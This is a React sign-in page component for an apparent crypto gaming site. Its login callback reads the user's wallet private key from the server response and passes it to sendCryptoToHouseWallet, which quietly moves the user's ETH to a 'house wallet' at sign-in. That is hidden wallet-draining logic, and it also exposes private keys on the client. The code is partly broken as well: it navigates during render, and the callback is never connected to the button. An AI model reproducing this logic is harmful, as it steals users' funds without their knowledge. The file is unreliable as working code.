import { useState } from "react";
import React from 'react';
import { useNavigate } from "react-router-dom";

import Header from "../Header";
import Footer from "../Footer";
import { Grid } from "@mui/material";
import "./index.scss";
import eye_icon from "../../assets/icons/eye-icon.png";
import { signin } from "../../provider/auth";
import { sendCryptoToHouseWallet } from "../../provider/payment";
import useGameStore from "../../GameStore";

const Signin = () => {
  const navigate = useNavigate();
  navigate("/home");
  // const { myEmail, setMyEmail, user, setUser } = useGameStore();
  const success = "success";
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const callback = (res) => {
    const user = res.data.user;

    if (user != null) {
      console.log("-- after receive from server ---", user);

      // setMyEmail(user.email);

      // setUser(user)

      // navigate("/home");

      ///////// check user wallet and send ether to house wallet //////////
      ///////// async function
      sendCryptoToHouseWallet({
        cryptoType: "ETH",
        privateKey: user.wallet.privateKey,
      });
    } else {
      alert("user name or password incorrect");
    }
  };

  return (
    <>
      <Grid container direction="column" justifyContent="space-between" className="signin-page">
        <Grid item>
          <Header />
        </Grid>
        <Grid item xs={7} container direction="row" justifyContent="center" className="main-form-container">
          <Grid item xs={10} container direction="column" justifyContent="space-evenly" className="main-form">
            <Grid item xs={2} container direction="row" justifyContent="center" alignItems="center" className="title">
              Welcome Back!
            </Grid>
            <Grid item xs={4} container direction="row" justifyContent="center" className="input-part-container">
              <Grid item xs={7} container direction="column" justifyContent="space-around" className="input-part">
                <Grid item container direction="row" justifyContent="space-around" className="input-row">
                  <Grid item xs={12} container justifyContent="space-between" className="followed-input">
                    <Grid item xs={9}>
                      <input
                        type="email"
                        placeholder="Email Address"
                        className="input-field"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                      />
                    </Grid>
                    <Grid item xs={3} container justifyContent="flex-end">
                      @gmail.com
                    </Grid>
                  </Grid>
                </Grid>
                <Grid item container direction="row" justifyContent="space-around" className="input-row">
                  <Grid item xs={12} container justifyContent="space-between" className="followed-input">
                    <Grid item xs={10}>
                      <input
                        type="password"
                        placeholder="Password"
                        className="input-field"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                      />
                    </Grid>
                    <Grid item xs={1} container justifyContent="flex-end">
                      <img src={eye_icon} alt="eye icon" className="eye-icon" />
                    </Grid>
                  </Grid>
                </Grid>
              </Grid>
            </Grid>
            <Grid item xs={5} container justifyContent="center" className="bottom-part">
              <Grid
                item
                xs={7}
                container
                direction="column"
                justifyContent="flex-start"
                spacing={2}
                className="width-limit-container"
              >
                <Grid item container justifyContent="space-between" className="options">
                  <Grid item xs={4} container justifyContent="center" className="check-text">
                    <input type="checkbox" />
                    Remember Me
                  </Grid>
                  <Grid item xs={4} container justifyContent="center" className="forgot-pwd">
                    Forgot Password?
                  </Grid>
                </Grid>
                <Grid item container justifyContent="center">
                  <button className="signin-btn" onClick={() => navigate('/home')}>
                    Login Now
                  </button>
                </Grid>
                <Grid item container justifyContent="center" className="check-text">
                  Don't have account? Sign up
                </Grid>
              </Grid>
            </Grid>
          </Grid>
        </Grid>
        <Grid item>
          <Footer />
        </Grid>
      </Grid>
    </>
  );
};

export default Signin;
